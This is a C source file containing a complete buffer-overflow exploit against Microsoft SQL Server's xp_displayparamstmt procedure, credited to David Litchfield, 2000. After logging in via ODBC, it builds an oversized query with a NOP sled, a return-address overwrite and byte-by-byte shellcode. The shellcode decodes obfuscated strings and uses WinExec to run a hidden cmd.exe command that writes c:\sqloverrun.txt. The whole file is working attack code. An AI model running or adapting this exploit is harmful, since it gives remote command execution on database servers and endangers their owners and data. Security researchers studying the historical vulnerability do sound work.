#include <stdio.h>
#include <windows.h>
#include <wchar.h>
#include <lmcons.h>
#include <sql.h>
#include <sqlext.h>


int main(int argc, char *argv[])
{
	char szBuffer[1025];  //display successful connection info on
                              //hdbc(s) combo-box    
	SWORD     swStrLen;               //String length   
	SQLHDBC   hdbc;                   //hdbc    
	SQLRETURN nResult;             
	SQLHANDLE henv;
	HSTMT  hstmt;
	SCHAR InConnectionString[1025] = "DRIVER={SQL Server};SERVER=";
	SCHAR server[100]="";
	SCHAR uid[32]=";UID=";
	SCHAR pwd[32]=";PWD=";
	SCHAR *db=";DATABASE=master";

	UCHAR query[20000] = "exec  xp_displayparamstmt '";
	unsigned char ch=0x01;

	int count = 27, var =0, result = 0, chk =0;
	
	if(argc !=4)
	{
		printf("USAGE:\t%s host uid pwd\nDavid Litchfield 9th November 2000\n",argv[0]);
		return 0;
	}

	strncpy(server,argv[1],96);
	strncat(uid,argv[2],28);
	strncat(pwd,argv[3],28);

	strncat(InConnectionString,server,96);
	strncat(InConnectionString,uid,28);
	strncat(InConnectionString,pwd,28);
	strcat(InConnectionString,db);


	while(count < 12083)
	{
			query[count]=0x90;
			count++;
	}

	// jmp eax
	query[count++]=0xFF;
	query[count++]=0xE0;
	
	// nops
	query[count++]=0x90;
	query[count++]=0x90;

	// overwrite saved return address
	query[count++]=0xAE;
	query[count++]=0x20;
	query[count++]=0xA6;
	query[count++]=0x41;

	// code starts in ernest

	query[count++]=0x90;
	// mov edx,eax
	query[count++]=0x8B;
	query[count++]=0xD0;

	// add edx,0x52 <- points to our string table
	query[count++]=0x83;
	query[count++]=0xC2;
	query[count++]=0x52;

	// push ebp
	query[count++]=0x55;

	// mov ebp,esp
	query[count++]=0x8B;
	query[count++]=0xEC;

	// mov edi,0x41A68014
	query[count++]=0xBF;
	query[count++]=0x14;
	query[count++]=0x80;
	query[count++]=0xA6;
	query[count++]=0x41;


	//mov esi,0x41A68040
	query[count++]=0xBE;
	query[count++]=0x40;
	query[count++]=0x80;
	query[count++]=0xA6;
	query[count++]=0x41;

	// mov ecx, 0xFFFFFFFF
	query[count++]=0xB9;
	query[count++]=0xFF;
	query[count++]=0xFF;
	query[count++]=0xFF;
	query[count++]=0xFF;


	 

	// sub ecx, 0xFFFFFFB3
	query[count++]=0x83;
	query[count++]=0xE9;
	query[count++]=0xB3;

	// here:

	// sub dword ptr[edx],1
	query[count++]=0x83;
	query[count++]=0x2A;
	query[count++]=0x01;

	// add edx,1
	query[count++]=0x83;
	query[count++]=0xC2;
	query[count++]=0x01;

	// sub ecx,1
	query[count++]=0x83;
	query[count++]=0xE9;
	query[count++]=0x01;

	// test ecx,ecx
	query[count++]=0x85;
	query[count++]=0xC9;

	// jne here
	query[count++]=0x75;
	query[count++]=0xF3;

	// sub edx, 0x48
	query[count++]=0x83;
	query[count++]=0xEA;
	query[count++]=0x48;

	// push edx <- calling LoadLibrary will mess edx so save it on stack
	// Even though we're about to push edx as an arg to LoadLibrary
	// we have to push it twice as LoadLibrary will remove one of them
	// from the stack - once the call has returned pop it back into edx

	query[count++]=0x52; 

	// LoadLibrary("kernel32.dll");
	// push edx
	query[count++]=0x52;

	// call [edi]
	query[count++]=0xFF;
	query[count++]=0x17;


	
	// pop edx
	query[count++]=0x5A;


	// On return LoadLibrary has placed a handle in EAX
	// save this on this stack for later use
	// push eax
	query[count++]=0x50;


	// GetProcAddress(HND,"WinExec");
	// add edx, 0x10
	query[count++]=0x83;
	query[count++]=0xC2;
	query[count++]=0x10;


	// push edx
	// need to save this again - pop it when GetProcAddress returns

	query[count++]=0x52;

	//push edx
	query[count++]=0x52;

	// push eax
	query[count++]=0x50;

	// call [esi]
	query[count++]=0xFF;
	query[count++]=0x16;

	// pop edx
	query[count++]=0x5A;

	// WinExec("cmd.exe /c.....",SW_HIDE);
	// add edx, 0x08
	query[count++]=0x83;
	query[count++]=0xC2;
	query[count++]=0x08;


	// push edx
	query[count++]=0x52; // <- save edx

	// xor ebx,ebx
	query[count++]=0x33;
	query[count++]=0xDB;

	// push ebx
	query[count++]=0x53;

	// push edx
	query[count++]=0x52;

	// call eax
	query[count++]=0xFF;
	query[count++]=0xD0;


	// With the shell spawned code now calls ExitProcess()

	//pop edx
	query[count++]=0x5A;

	
	// pop eax <- This is saved handle to kernel32.dll
	query[count++]=0x58;



	// GetProcAddress(HND,"ExitProcess");
	// add edx,0x24
	query[count++]=0x83;
	query[count++]=0xC2;
	query[count++]=0x24;


	// push edx
	query[count++]=0x52;

	// push eax
	query[count++]=0x50;

	// call [esi]
	query[count++]=0xFF;
	query[count++]=0x16;


	// call ExitProcess(0);
	// xor ebx,ebx
	query[count++]=0x33;
	query[count++]=0xDB;

	// push ebx
	query[count++]=0x53;

	// call eax
	query[count++]=0xFF;
	query[count++]=0xD0;


	// Here are our strings
	// kernel32.dll, WinExec, cmd.exe /c ... , ExitProcess
	// 1 has been added to each character to 'hide' the nulls
	// the loop will sub 1 from each char

	query[count++]=0x01;
	query[count++]=0x01;
	query[count++]=0x01;
	query[count++]=0x01;
	query[count++]=0x6c;
	query[count++]=0x66;
	query[count++]=0x73;
	query[count++]=0x6f;
	query[count++]=0x66;
	query[count++]=0x6d;
	query[count++]=0x34;
	query[count++]=0x33;
	query[count++]=0x2f;
	query[count++]=0x65;
	query[count++]=0x6d;
	query[count++]=0x6d;
	query[count++]=0x01;
	query[count++]=0x01;
	query[count++]=0x01;
	query[count++]=0x01;
	query[count++]=0x58;
	query[count++]=0x6a;
	query[count++]=0x6f;
	query[count++]=0x46;
	query[count++]=0x79;
	query[count++]=0x66;
	query[count++]=0x64;
	query[count++]=0x01;
	query[count++]=0x64;
	query[count++]=0x6e;
	query[count++]=0x65;
	query[count++]=0x2f;
	query[count++]=0x66;
	query[count++]=0x79;
	query[count++]=0x66;
	query[count++]=0x21;
	query[count++]=0x30;
	query[count++]=0x64;
	query[count++]=0x21;
	query[count++]=0x65;
	query[count++]=0x6a;
	query[count++]=0x73;
	query[count++]=0x21;
	query[count++]=0x3f;
	query[count++]=0x21;
	query[count++]=0x64;
	query[count++]=0x3b;
	query[count++]=0x5d;
	query[count++]=0x74;
	query[count++]=0x72;
	query[count++]=0x6d;
	query[count++]=0x70;
	query[count++]=0x77;
	query[count++]=0x66;
	query[count++]=0x73;
	query[count++]=0x73;
	query[count++]=0x76;
	query[count++]=0x6f;
	query[count++]=0x2f;
	query[count++]=0x75;
	query[count++]=0x79;
	query[count++]=0x75;
	query[count++]=0x01;
	query[count++]=0x01;
	query[count++]=0x46;
	query[count++]=0x79;
	query[count++]=0x6a;
	query[count++]=0x75;
	query[count++]=0x51;
	query[count++]=0x73;
	query[count++]=0x70;
	query[count++]=0x64;
	query[count++]=0x66;
	query[count++]=0x74;
	query[count++]=0x74;
	query[count++]=0x01;




	strcat(query,"',2,3");

	
	
	if (SQLAllocHandle(SQL_HANDLE_ENV,SQL_NULL_HANDLE,&henv) !=
SQL_SUCCESS)
		{
			printf("Error SQLAllocHandle");
			return 0;

		}

	if (SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION,(SQLPOINTER)
SQL_OV_ODBC3, SQL_IS_INTEGER) != SQL_SUCCESS)
		{
			printf("Error SQLSetEnvAttr");
			return 0;

		}


	if ((nResult = SQLAllocHandle(SQL_HANDLE_DBC,henv,(SQLHDBC FAR
*)&hdbc)) != SQL_SUCCESS) 
		{
			printf("SQLAllocHandle - 2");
			return 0;
			
		}

	nResult = SQLDriverConnect(hdbc, NULL, InConnectionString,
strlen(InConnectionString), szBuffer,  1024, &swStrLen,
SQL_DRIVER_COMPLETE_REQUIRED);      
	if(nResult == SQL_SUCCESS | nResult == SQL_SUCCESS_WITH_INFO)
		{

			printf("Connected to MASTER database...\n\n");
			SQLAllocStmt(hdbc,&hstmt);
		}

	else
	{
		printf("Couldn't connect.\n");
		return 0;
	}

	if(SQLExecDirect(hstmt,query,SQL_NTS) !=SQL_SUCCESS)
		{
			printf("\nBuffer has been  sent...c:\\sqloverrun.txt should now exist.");

			return 0;

		}
	printf("Buffer sent...");	
	


return 0;
}
